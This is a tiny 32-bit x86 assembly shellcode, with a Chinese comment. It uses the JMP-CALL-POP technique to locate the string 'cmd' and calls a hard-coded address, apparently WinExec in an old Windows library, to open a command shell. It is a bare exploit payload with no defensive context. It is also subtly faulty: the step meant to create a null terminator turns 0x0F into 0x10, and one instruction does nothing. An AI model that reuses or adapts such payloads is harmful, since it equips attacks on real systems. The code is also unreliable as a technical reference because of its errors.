BITS 32

		JMP		get_cmd_data
start:
		POP		edx			;edx保存cmd_data标签后的数据
		XOR		eax,eax
		PUSH	eax
		mov		al,3
		inc		BYTE PTR [edx+3]
		PUSH	edx
		MOV		eax,0x7C8623AD
		CALL	eax	

get_cmd_data:
		CALL	start
cmd_data:
		db 'c'
		db 'm'
		db 'd'
null_byte:
		db 0x0F
		
